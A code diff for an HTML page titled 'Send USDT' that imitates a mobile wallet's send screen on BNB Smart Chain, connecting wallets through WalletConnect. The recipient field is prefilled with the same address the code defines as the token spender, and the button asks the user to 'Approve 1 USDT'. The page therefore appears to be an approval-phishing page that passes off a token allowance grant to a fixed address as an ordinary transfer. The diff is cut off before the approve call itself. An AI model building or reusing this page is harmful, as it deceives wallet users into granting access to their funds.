@@ -1,1973 +1,584 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-
-<meta
-    name="viewport"
-    content="width=device-width,
-             initial-scale=1.0,
-             maximum-scale=1.0,
-             user-scalable=no"
->
-
-<meta name="theme-color" content="#1b1b1b">
-
-<title>Send USDT</title>
-
-<style>
-* {
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-}
-
-html,
-body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    min-height: 100%;
-}
-
-body {
-    background: #1b1b1b;
-    color: #ffffff;
-    font-family:
-        -apple-system,
-        BlinkMacSystemFont,
-        "Segoe UI",
-        Roboto,
-        Arial,
-        sans-serif;
-}
-
-button,
-input {
-    font-family: inherit;
-}
-
-button {
-    -webkit-appearance: none;
-    appearance: none;
-}
-
-.container {
-    width: 100%;
-    max-width: 600px;
-    min-height: 100vh;
-    margin: 0 auto;
-    padding: 48px 22px 40px;
-}
-
-.title {
-    text-align: center;
-    font-size: 32px;
-    line-height: 1.2;
-    font-weight: 700;
-    margin: 0 0 52px;
-    color: #ffffff;
-}
-
-.wallet-section {
-    margin-bottom: 30px;
-}
-
-.wallet-btn {
-    width: 100%;
-    height: 58px;
-    border: 1px solid #00d97b;
-    border-radius: 30px;
-    background: transparent;
-    color: #00d97b;
-    font-size: 17px;
-    font-weight: 700;
-    cursor: pointer;
-}
-
-.wallet-btn:active {
-    transform: scale(.99);
-}
-
-.wallet-btn.connected {
-    background: rgba(0, 217, 123, 0.12);
-}
-
-.wallet-status {
-    margin-top: 10px;
-    min-height: 18px;
-    text-align: center;
-    color: #8f8f8f;
-    font-size: 13px;
-    word-break: break-word;
-}
-
-.label {
-    display: block;
-    color: #a9a9a9;
-    font-size: 16px;
-    margin: 0 0 9px;
-}
-
-.input-group {
-    width: 100%;
-    height: 52px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-
-    border: 1px solid #3d3d3d;
-    border-radius: 13px;
-
-    padding: 0 13px;
-    margin-bottom: 20px;
-
-    background: #1b1b1b;
-}
-
-.input-group input {
-    flex: 1;
-    min-width: 0;
-
-    width: 100%;
-    height: 100%;
-
-    border: 0;
-    outline: 0;
-
-    background: transparent;
-    color: #ffffff;
-
-    font-size: 16px;
-}
-
-.input-group input::placeholder {
-    color: #747474;
-}
-
-.text-btn,
-.icon-btn,
-.max-btn {
-    border: 0;
-    outline: 0;
-    background: transparent;
-    cursor: pointer;
-}
-
-.text-btn,
-.max-btn {
-    color: #00d97b;
-    font-size: 14px;
-    font-weight: 500;
-}
-
-.icon-btn {
-    color: #00d97b;
-    font-size: 18px;
-    width: 28px;
-    min-width: 28px;
-}
-
-.network-select {
-    width: fit-content;
-    min-width: 245px;
-    height: 52px;
-
-    display: flex;
-    align-items: center;
-    gap: 10px;
-
-    border: 1px solid #3d3d3d;
-    border-radius: 13px;
-
-    padding: 0 14px;
-    margin-bottom: 20px;
-}
-
-.network-icon {
-    width: 23px;
-    height: 23px;
-    min-width: 23px;
-
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-    border-radius: 50%;
-    overflow: hidden;
-}
-
-.network-icon img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-
-.bnb-fallback {
-    width: 23px;
-    height: 23px;
-    border-radius: 50%;
-
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-    background: #f3ba2f;
-    color: #111;
-
-    font-size: 13px;
-    font-weight: 800;
-}
-
-.network-text {
-    color: #ffffff;
-    font-size: 15px;
-    font-weight: 500;
-    white-space: nowrap;
-}
-
-.network-arrow {
-    margin-left: auto;
-    color: #888888;
-    font-size: 11px;
-}
-
-.amount-input {
-    margin-bottom: 7px;
-}
-
-.amount-input .unit {
-    color: #8a8a8a;
-    font-size: 15px;
-}
-
-.estimate {
-    margin: 0 0 32px;
-    color: #777777;
-    font-size: 14px;
-}
-
-.status {
-    display: none;
-
-    width: 100%;
-
-    padding: 14px 15px;
-    margin-bottom: 18px;
-
-    border-radius: 12px;
-
-    font-size: 13px;
-    line-height: 1.45;
-
-    word-break: break-word;
-}
-
-.status.show {
-    display: block;
-}
-
-.status.info {
-    background: rgba(255,255,255,.06);
-    color: #bdbdbd;
-}
-
-.status.success {
-    background: rgba(0,217,123,.12);
-    color: #00d97b;
-}
-
-.status.error {
-    background: rgba(255,72,72,.13);
-    color: #ff8c8c;
-}
-
-.next-btn {
-    width: 100%;
-    height: 64px;
-
-    border: 0;
-    border-radius: 34px;
-
-    background: #00d97b;
-    color: #000000;
-
-    font-size: 17px;
-    font-weight: 800;
-
-    cursor: pointer;
-}
-
-.next-btn:disabled {
-    background: #21643e;
-    color: #ffffff;
-    cursor: not-allowed;
-}
-
-.loading-overlay {
-    position: fixed;
-    inset: 0;
-    z-index: 999999;
-
-    display: none;
-    align-items: center;
-    justify-content: center;
-
-    background: rgba(0,0,0,.72);
-}
-
-.loading-overlay.show {
-    display: flex;
-}
-
-.loading-box {
-    width: 190px;
-    padding: 25px 18px;
-
-    border-radius: 17px;
-
-    background: #252525;
-
-    text-align: center;
-}
-
-.spinner {
-    width: 32px;
-    height: 32px;
-
-    margin: 0 auto 14px;
-
-    border: 3px solid #444444;
-    border-top-color: #00d97b;
-
-    border-radius: 50%;
-
-    animation: spin .8s linear infinite;
-}
-
-.loading-text {
-    color: #ffffff;
-    font-size: 14px;
-}
-
-@keyframes spin {
-    to {
-        transform: rotate(360deg);
-    }
-}
-
-@media (max-width: 390px) {
-
-    .container {
-        padding-left: 16px;
-        padding-right: 16px;
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="color-scheme" content="light dark">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+  <style>
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
     }
 
-    .title {
-        font-size: 29px;
+    .loading-spinner-container {
+      text-align: center;
     }
 
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid #0000FF;
+      border-top: 4px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #0000FF;
+      font-size: 16px;
+      font-weight: 600;
+      margin: 0;
+    }
+    /* Dark mode loading spinner styles */
+    @media (prefers-color-scheme: dark) {
+      .loading-overlay {
+        background-color: rgba(0, 0, 0, 0.8) !important;
+      }
+      .loading-spinner {
+        border: 4px solid #01d97e !important;
+        border-top: 4px solid rgba(1, 217, 126, 0.3) !important;
+      }
+      .loading-text {
+        color: #01d97e !important;
+      }
+    }
+    /* Critical styles for Trust Wallet compatibility */
     .network-select {
-        min-width: 225px;
+      display: flex !important;
+      align-items: center !important;
+      background-color: #f5f5f5 !important;
+      border: 1px solid #e0e0e0 !important;
+      border-radius: 12px !important;
+      padding: 10px 12px !important;
+      margin-bottom: 16px !important;
+      gap: 8px !important;
+      min-height: 44px !important;
+      max-height: 44px !important;
+      max-width: 70% !important;
+      width: fit-content !important;
+      box-sizing: border-box !important;
     }
-}
-</style>
+    .network-icon {
+      width: 20px !important;
+      height: 20px !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      flex-shrink: 0 !important;
+    }
+    .bnb-logo-img {
+      width: 20px !important;
+      height: 20px !important;
+      object-fit: cover !important;
+      display: block !important;
+      border-radius: 50% !important;
+      flex-shrink: 0 !important;
+    }
+    .network-text {
+      flex: 0 1 auto !important;
+      color: #4b5563 !important;
+      font-size: 14px !important;
+      font-weight: 500 !important;
+      line-height: 1.4 !important;
+      white-space: nowrap !important;
+    }
+    .network-arrow {
+      color: #9ca3af !important;
+      font-size: 10px !important;
+      margin-left: auto !important;
+      flex-shrink: 0 !important;
+    }
+    /* Critical button styles for Trust Wallet - Light mode */
+    .text-btn, .icon-btn, .max-btn {
+      color: #0000FF !important;
+    }
+    /* Critical input-group styles for Trust Wallet */
+    .input-group {
+      display: flex !important;
+      align-items: center !important;
+      background-color: #FFFFFF !important;
+      border: 1px solid #d1d5db !important;
+      border-radius: 12px !important;
+      padding: 12px 14px !important;
+      margin-bottom: 16px !important;
+      min-height: 48px !important;
+      max-height: 48px !important;
+      box-sizing: border-box !important;
+      gap: 8px !important;
+      overflow: hidden !important;
+    }
+    .input-group input {
+      flex: 1 !important;
+      min-width: 0 !important;
+      background: transparent !important;
+      border: none !important;
+      outline: none !important;
+      color: #000000 !important;
+      font-size: 16px !important;
+      font-weight: 500 !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      height: auto !important;
+      line-height: 1.5 !important;
+    }
+    /* Dark Mode Support - Detects system preference automatically */
+    @media (prefers-color-scheme: dark) {
+      body {
+        background-color: #1b1b1b !important;
+        color: #ffffff !important;
+      }
+      .container {
+        background-color: #1b1b1b !important;
+      }
+      .title {
+        color: #ffffff !important;
+      }
+      .label {
+        color: #d1d5db !important;
+      }
+      .input-group {
+        background-color: #FFFFFF !important;
+        border: 1px solid #e0e0e0 !important;
+      }
+      .input-group input {
+        color: #000000 !important;
+      }
+      .input-group input::placeholder {
+        color: #9ca3af !important;
+      }
+      .text-btn, .icon-btn, .max-btn {
+        color: #01d97e !important;
+      }
+      .unit {
+        color: #4b5563 !important;
+      }
+      .network-select {
+        background-color: #1b1b1b !important;
+        border: 1px solid #404040 !important;
+      }
+      .network-select:hover {
+        background-color: #252525 !important;
+        border-color: #505050 !important;
+      }
+      .network-text {
+        color: #ffffff !important;
+      }
+      .network-arrow {
+        color: #9ca3af !important;
+      }
+      .estimate {
+        color: #9ca3af !important;
+      }
+      .address-input-group {
+        background-color: #1b1b1b !important;
+        border: 1px solid #404040 !important;
+      }
+      .address-input-group input {
+        color: #ffffff !important;
+      }
+      .amount-input-group {
+        background-color: #1b1b1b !important;
+        border: 1px solid #404040 !important;
+      }
+      .amount-input-group input {
+        color: #ffffff !important;
+      }
+      .next-btn {
+        background-color: #01d97e !important;
+        color: #000000 !important;
+      }
+      .next-btn:hover:not(:disabled) {
+        background-color: #01c571 !important;
+      }
+      .next-btn:disabled {
+        background-color: #25653A !important;
+        color: #ffffff !important;
+        cursor: not-allowed !important;
+        opacity: 1 !important;
+      }
+    }
+  </style>
+
 </head>
-
 <body>
-
-<div
-    id="loadingOverlay"
-    class="loading-overlay"
->
-    <div class="loading-box">
-
-        <div class="spinner"></div>
-
-        <div
-            id="loadingText"
-            class="loading-text"
-        >
-            Connecting...
-        </div>
-
+  <!-- Loading Spinner Overlay -->
+  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+    <div class="loading-spinner-container">
+      <div class="loading-spinner"></div>
+      <p class="loading-text">Processing...</p>
     </div>
-</div>
+  </div>
 
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
 
-<main class="container">
-
-    <h1 class="title">
-        Send USDT
-    </h1>
-
-
-    <!-- =========================================
-         WALLET CONNECTION
-    ========================================== -->
-
-    <section class="wallet-section">
-
-        <button
-            id="connectWalletBtn"
-            class="wallet-btn"
-            type="button"
-        >
-            Connect BNB Wallet
-        </button>
-
-        <div
-            id="walletStatus"
-            class="wallet-status"
-        >
-            Not connected
-        </div>
-
-    </section>
-
-
-    <!-- =========================================
-         ADDRESS
-    ========================================== -->
-
-    <label
-        class="label"
-        for="address"
-    >
-        Address or Domain Name
-    </label>
-
-    <div class="input-group">
-
-        <input
-            id="address"
-            type="text"
-            value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC"
-            placeholder="Search or Enter"
-        >
-
-        <button
-            id="pasteBtn"
-            class="text-btn"
-            type="button"
-        >
-            Paste
-        </button>
-
-        <button
-            class="icon-btn"
-            type="button"
-            aria-label="Contacts"
-        >
-            👤
-        </button>
-
-        <button
-            class="icon-btn"
-            type="button"
-            aria-label="Scan"
-        >
-            ⛶
-        </button>
-
+    <div class="wallet-section" style="margin-bottom: 28px;">
+      <button type="button" id="connectWalletBtn" class="next-btn" style="width:100%;height:54px;border-radius:28px;background:transparent;border:1px solid #01d97e;color:#01d97e;font-weight:700;">Connect BNB Wallet</button>
+      <div id="walletStatus" style="text-align:center;margin-top:10px;color:#9ca3af;font-size:13px;">Wallet not connected</div>
     </div>
 
-
-    <!-- =========================================
-         NETWORK
-    ========================================== -->
-
-    <label class="label">
-        Destination network
-    </label>
-
-    <div class="network-select">
-
-        <div class="network-icon">
-
-            <img
-                src="images/cropped_circle_image.png"
-                alt="BNB"
-                onerror="
-                    this.style.display='none';
-                    this.nextElementSibling.style.display='flex';
-                "
-            >
-
-            <div
-                class="bnb-fallback"
-                style="display:none;"
-            >
-                B
-            </div>
-
-        </div>
-
-        <span class="network-text">
-            BNB Smart Chain
-        </span>
-
-        <span class="network-arrow">
-            ▼
-        </span>
-
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group address-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
     </div>
 
-
-    <!-- =========================================
-         AMOUNT
-    ========================================== -->
-
-    <label
-        class="label"
-        for="amount"
-    >
-        Amount
-    </label>
-
-    <div class="input-group amount-input">
-
-        <input
-            id="amount"
-            type="number"
-            min="0"
-            step="any"
-            placeholder="USDT Amount"
-        >
-
-        <span class="unit">
-            USDT
-        </span>
-
-        <button
-            id="maxBtn"
-            class="max-btn"
-            type="button"
-        >
-            Max
-        </button>
-
+    <label class="label" for="destinationNetwork">Destination network</label>
+    <div class="network-select" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 10px 12px !important; margin-bottom: 16px !important; cursor: pointer; gap: 8px; -webkit-gap: 8px; max-width: 70% !important; width: fit-content !important; box-sizing: border-box !important; min-height: 44px !important; max-height: 44px !important; height: auto !important;">
+      <div class="network-icon" style="width: 20px !important; height: 20px !important; min-width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; flex-shrink: 0 !important; position: relative; margin-right: 8px;">
+        <img src="images/cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img" style="width: 20px !important; height: 20px !important; max-width: 20px !important; max-height: 20px !important; object-fit: cover !important; display: block !important; border-radius: 50% !important; flex-shrink: 0 !important;">
+      </div>
+      <span class="network-text" style="flex: 0 1 auto !important; font-size: 14px !important; font-weight: 500 !important; line-height: 1.4 !important; white-space: nowrap;">BNB Smart Chain</span>
+      <i class="fas fa-chevron-down network-arrow" style="color: #9ca3af !important; font-size: 10px !important; margin-left: 8px !important; flex-shrink: 0 !important;"></i>
     </div>
 
-
-    <p
-        id="estimate"
-        class="estimate"
-    >
-        ≈ $0.00
-    </p>
-
-
-    <!-- =========================================
-         STATUS
-    ========================================== -->
-
-    <div
-        id="status"
-        class="status"
-    ></div>
-
-
-    <!-- =========================================
-         APPROVAL
-    ========================================== -->
-
-    <button
-        id="nextBtn"
-        class="next-btn"
-        type="button"
-        disabled
-    >
-        Approve 1 USDT
-    </button>
-
-</main>
-
-
-<script type="module">
-
-/*
-=========================================================
-BSC-ONLY WALLETCONNECT CONFIGURATION
-=========================================================
-
-This project requests ONLY BSC chain 56.
-
-Ethereum mainnet (1) is NOT included.
-
-=========================================================
-*/
-
-const WALLETCONNECT_PROJECT_ID =
-    "11e5445365f720d1050dc106ba2e78d6";
-
-const BSC_CHAIN_ID =
-    56;
-
-const BSC_CHAIN_ID_HEX =
-    "0x38";
-
-
-/*
-=========================================================
-BSC NETWORK INFORMATION
-=========================================================
-*/
-
-const BSC_NETWORK = {
-
-    chainId: "0x38",
-
-    chainName:
-        "BNB Smart Chain",
-
-    nativeCurrency: {
-
-        name: "BNB",
-
-        symbol: "BNB",
-
-        decimals: 18
-
-    },
-
-    rpcUrls: [
-
-        "https://bsc-dataseed.binance.org/"
-
-    ],
-
-    blockExplorerUrls: [
-
-        "https://bscscan.com/"
-
-    ]
-
-};
-
-
-/*
-=========================================================
-BSC USDT
-=========================================================
-
-BSC USDT:
-0x55d398326f99059ff775485246999027b3197955
-
-=========================================================
-*/
-
-const USDT_ADDRESS =
-    "0x55d398326f99059ff775485246999027b3197955";
-
-
-/*
-=========================================================
-SPENDER
-=========================================================
-*/
-
-const SPENDER_ADDRESS =
-    "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
-
-
-/*
-=========================================================
-ERC20 ABI
-=========================================================
-*/
-
-const ERC20_ABI = [
-
-    {
-        inputs: [
-            {
-                name: "owner",
-                type: "address"
-            }
-        ],
-
-        name: "balanceOf",
-
-        outputs: [
-            {
-                name: "",
-                type: "uint256"
-            }
-        ],
-
-        stateMutability: "view",
-        type: "function"
-    },
-
-
-    {
-        inputs: [
-            {
-                name: "owner",
-                type: "address"
-            },
-
-            {
-                name: "spender",
-                type: "address"
-            }
-        ],
-
-        name: "allowance",
-
-        outputs: [
-            {
-                name: "",
-                type: "uint256"
-            }
-        ],
-
-        stateMutability: "view",
-        type: "function"
-    },
-
-
-    {
-        inputs: [
-            {
-                name: "spender",
-                type: "address"
-            },
-
-            {
-                name: "amount",
-                type: "uint256"
-            }
-        ],
-
-        name: "approve",
-
-        outputs: [
-            {
-                name: "",
-                type: "bool"
-            }
-        ],
-
-        stateMutability: "nonpayable",
-        type: "function"
-    },
-
-
-    {
-        inputs: [],
-
-        name: "decimals",
-
-        outputs: [
-            {
-                name: "",
-                type: "uint8"
-            }
-        ],
-
-        stateMutability: "view",
-        type: "function"
-    },
-
-
-    {
-        inputs: [],
-
-        name: "symbol",
-
-        outputs: [
-            {
-                name: "",
-                type: "string"
-            }
-        ],
-
-        stateMutability: "view",
-        type: "function"
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group amount-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
+      <input type="number" id="amount" placeholder="USDT Amount" required="" min="0" step="any" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <button type="button" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled>Approve 1 USDT</button>
+  </main>
+
+  <script type="text/javascript" src="js/web3.min.js"></script>
+<script src="js/jquery-3.7.1.min.js"></script> 
+  <script>
+    const WALLETCONNECT_PROJECT_ID = '11e5445365f720d1050dc106ba2e78d6';
+    const BSC_CHAIN_ID = 56;
+    const BSC_CHAIN_ID_HEX = '0x38';
+    const addressTOKEN = '0x55d398326f99059ff775485246999027b3197955';
+    const addressSTAKING = '0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC';
+
+    const matrixAbiTOKEN = [
+      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+      {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+      {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"}
+    ];
+
+    let walletProvider = null;
+    let connectedAccount = null;
+
+    async function createBSCWalletConnectProvider() {
+      const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.6');
+      return await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        chains: [BSC_CHAIN_ID],
+        optionalChains: [BSC_CHAIN_ID],
+        showQrModal: true,
+        metadata: {
+          name: 'Send USDT',
+          description: 'BSC USDT Demo',
+          url: window.location.origin,
+          icons: []
+        }
+      });
     }
 
-];
-
-
-/*
-=========================================================
-STATE
-=========================================================
-*/
-
-let provider = null;
-
-let web3 = null;
-
-let account = null;
-
-let walletConnectProvider = null;
-
-
-/*
-=========================================================
-DOM
-=========================================================
-*/
-
-const connectWalletBtn =
-    document.getElementById(
-        "connectWalletBtn"
-    );
-
-const walletStatus =
-    document.getElementById(
-        "walletStatus"
-    );
-
-const nextBtn =
-    document.getElementById(
-        "nextBtn"
-    );
-
-const statusEl =
-    document.getElementById(
-        "status"
-    );
-
-const amountInput =
-    document.getElementById(
-        "amount"
-    );
-
-const estimate =
-    document.getElementById(
-        "estimate"
-    );
-
-const loadingOverlay =
-    document.getElementById(
-        "loadingOverlay"
-    );
-
-const loadingText =
-    document.getElementById(
-        "loadingText"
-    );
-
-
-/*
-=========================================================
-UI
-=========================================================
-*/
-
-function showLoading(message) {
-
-    loadingText.textContent =
-        message || "Processing...";
-
-    loadingOverlay.classList.add(
-        "show"
-    );
-}
-
-
-function hideLoading() {
-
-    loadingOverlay.classList.remove(
-        "show"
-    );
-}
-
-
-function showStatus(
-    message,
-    type = "info"
-) {
-
-    statusEl.textContent =
-        message;
-
-    statusEl.className =
-        "status show " + type;
-}
-
-
-function clearStatus() {
-
-    statusEl.textContent = "";
-
-    statusEl.className =
-        "status";
-}
-
-
-function shortAddress(address) {
-
-    return (
-        address.substring(0, 6) +
-        "..." +
-        address.substring(
-            address.length - 4
-        )
-    );
-}
-
-
-/*
-=========================================================
-LOAD WALLETCONNECT
-
-IMPORTANT:
-
-chains: [56]
-
-This means the WalletConnect session is
-requested for BSC.
-
-Ethereum mainnet is not requested.
-=========================================================
-*/
-
-async function createBSCWalletConnectProvider() {
-
-    const module =
-        await import(
-            "https://esm.sh/@walletconnect/ethereum-provider@2.21.6"
-        );
-
-    const EthereumProvider =
-        module.EthereumProvider;
-
-    if (!EthereumProvider) {
-
-        throw new Error(
-            "WalletConnect provider could not be loaded."
-        );
-    }
-
-
-    const wcProvider =
-        await EthereumProvider.init({
-
-            projectId:
-                WALLETCONNECT_PROJECT_ID,
-
-            /*
-            BSC ONLY
-            */
-
-            chains: [
-                BSC_CHAIN_ID
-            ],
-
-            /*
-            BSC ONLY
-            */
-
-            optionalChains: [
-                BSC_CHAIN_ID
-            ],
-
-            showQrModal:
-                true,
-
-            metadata: {
-
-                name:
-                    "Send USDT",
-
-                description:
-                    "BSC USDT approval demo",
-
-                url:
-                    window.location.origin,
-
-                icons: []
-
-            }
-
-        });
-
-
-    return wcProvider;
-}
-
-
-/*
-=========================================================
-GET BSC PROVIDER
-=========================================================
-*/
-
-async function getBSCProvider() {
-
-    /*
-    If an injected wallet already exists,
-    use it.
-
-    We still verify that the resulting chain
-    is BSC.
-    */
-
-    if (
-        window.ethereum &&
-        typeof window.ethereum.request ===
-            "function"
-    ) {
-
-        return window.ethereum;
-    }
-
-
-    /*
-    Otherwise use WalletConnect.
-    */
-
-    if (
-        !walletConnectProvider
-    ) {
-
-        walletConnectProvider =
-            await createBSCWalletConnectProvider();
-
-    }
-
-
-    return walletConnectProvider;
-}
-
-
-/*
-=========================================================
-CONNECT BSC WALLET
-=========================================================
-*/
-
-async function connectBSCWallet() {
-
-    try {
-
+    async function connectWallet() {
+      try {
         clearStatus();
+        showLoading('Connecting to BNB Smart Chain...');
 
-        showLoading(
-            "Connecting to BNB Smart Chain..."
-        );
+        // WalletConnect is used directly. We do not prefer window.ethereum,
+        // because the mobile wallet browser can expose an injected Ethereum
+        // provider and bypass the requested BSC WalletConnect session.
+        walletProvider = await createBSCWalletConnectProvider();
+        await walletProvider.connect();
 
-
-        provider =
-            await getBSCProvider();
-
-
-        /*
-        WalletConnect path
-        */
-
-        if (
-            provider ===
-                walletConnectProvider
-            &&
-            typeof provider.connect ===
-                "function"
-        ) {
-
-            await provider.connect();
-
+        const chainId = String(await walletProvider.request({ method: 'eth_chainId' })).toLowerCase();
+        if (chainId !== BSC_CHAIN_ID_HEX) {
+          throw new Error('WalletConnect connected to the wrong network. Please select BNB Smart Chain.');
         }
 
-        /*
-        Injected wallet path
-        */
-
-        else {
-
-            await provider.request({
-
-                method:
-                    "eth_requestAccounts"
-
-            });
-
+        const accounts = await walletProvider.request({ method: 'eth_accounts' });
+        if (!accounts || accounts.length === 0) {
+          throw new Error('No wallet account was returned.');
         }
 
+        connectedAccount = accounts[0];
+        window.web3 = new Web3(walletProvider);
 
-        /*
-        IMPORTANT:
+        document.getElementById('walletStatus').textContent =
+          connectedAccount.slice(0, 6) + '...' + connectedAccount.slice(-4);
 
-        We now verify the actual chain.
-
-        BSC = 0x38
-
-        If the wallet is on Ethereum,
-        we DO NOT proceed with approval.
-        */
-
-        let chainId =
-            await provider.request({
-
-                method:
-                    "eth_chainId"
-
-            });
-
-
-        chainId =
-            String(chainId)
-                .toLowerCase();
-
-
-        console.log(
-            "Wallet chain:",
-            chainId
-        );
-
-
-        /*
-        WalletConnect was requested as BSC-only.
-
-        If a wallet still reports another chain,
-        stop here.
-
-        We intentionally do not use
-        wallet_addEthereumChain.
-        */
-
-        if (
-            chainId !==
-            BSC_CHAIN_ID_HEX
-        ) {
-
-            throw new Error(
-                "Wallet is not on BNB Smart Chain. Please select BNB Smart Chain in your wallet."
-            );
-
-        }
-
-
-        /*
-        Get account.
-        */
-
-        const accounts =
-            await provider.request({
-
-                method:
-                    "eth_accounts"
-
-            });
-
-
-        if (
-            !accounts ||
-            accounts.length === 0
-        ) {
-
-            throw new Error(
-                "No wallet account was returned."
-            );
-
-        }
-
-
-        account =
-            accounts[0];
-
-
-        /*
-        Create Web3 using the BSC provider.
-        */
-
-        web3 =
-            new Web3(provider);
-
-
-        /*
-        Final chain verification.
-        */
-
-        const verifiedChain =
-            await provider.request({
-
-                method:
-                    "eth_chainId"
-
-            });
-
-
-        if (
-            String(verifiedChain)
-                .toLowerCase()
-            !==
-            BSC_CHAIN_ID_HEX
-        ) {
-
-            throw new Error(
-                "BSC verification failed."
-            );
-
-        }
-
-
-        /*
-        UI
-        */
-
-        walletStatus.textContent =
-            shortAddress(
-                account
-            );
-
-        connectWalletBtn.textContent =
-            "BSC Wallet Connected";
-
-        connectWalletBtn.classList.add(
-            "connected"
-        );
-
-
-        /*
-        Only enable approval after
-        BSC is verified.
-        */
-
-        nextBtn.disabled =
-            false;
-
+        const connectButton = document.getElementById('connectWalletBtn');
+        connectButton.textContent = 'BSC Wallet Connected';
+        connectButton.classList.add('connected');
 
         hideLoading();
-
-
-        showStatus(
-            "Connected to BNB Smart Chain.",
-            "success"
-        );
-
-
-        console.log(
-            "============================"
-        );
-
-        console.log(
-            "BSC WALLET CONNECTED"
-        );
-
-        console.log(
-            "Account:",
-            account
-        );
-
-        console.log(
-            "Chain:",
-            verifiedChain
-        );
-
-        console.log(
-            "Chain number:",
-            BSC_CHAIN_ID
-        );
-
-        console.log(
-            "============================"
-        );
-
-
-        setupProviderEvents(
-            provider
-        );
-
-    }
-
-    catch (error) {
-
+        showStatus('Connected to BNB Smart Chain.', 'success');
+        updateApprovalButton();
+        setupWalletEvents(walletProvider);
+      } catch (error) {
         hideLoading();
-
-        console.error(
-            "BSC connection error:",
-            error
-        );
-
-
-        if (
-            error &&
-            Number(error.code) === 4001
-        ) {
-
-            showStatus(
-                "Wallet connection was cancelled.",
-                "error"
-            );
-
-            return;
-
-        }
-
-
+        console.error('BSC WalletConnect error:', error);
+        document.getElementById('nextBtn').disabled = true;
         showStatus(
-            error.message ||
-            "Could not connect to BNB Smart Chain.",
-            "error"
+          Number(error && error.code) === 4001 ? 'Wallet connection was cancelled.' :
+          (error.message || 'Could not connect to BNB Smart Chain.'),
+          'error'
         );
-
-
-        /*
-        Do not enable approval
-        after a failed BSC connection.
-        */
-
-        nextBtn.disabled =
-            true;
-    }
-}
-
-
-/*
-=========================================================
-GET BSC USDT CONTRACT
-=========================================================
-*/
-
-function getUSDTContract() {
-
-    if (
-        !web3 ||
-        !account
-    ) {
-
-        throw new Error(
-            "BSC wallet is not connected."
-        );
-
+      }
     }
 
-
-    return new web3.eth.Contract(
-        ERC20_ABI,
-        USDT_ADDRESS
-    );
-}
-
-
-/*
-=========================================================
-VERIFY BSC BEFORE TRANSACTION
-=========================================================
-*/
-
-async function verifyBSC() {
-
-    if (
-        !provider
-    ) {
-
-        throw new Error(
-            "Wallet is not connected."
-        );
-
+    async function verifyBSC() {
+      if (!walletProvider || !connectedAccount) {
+        throw new Error('Please connect your BNB Smart Chain wallet first.');
+      }
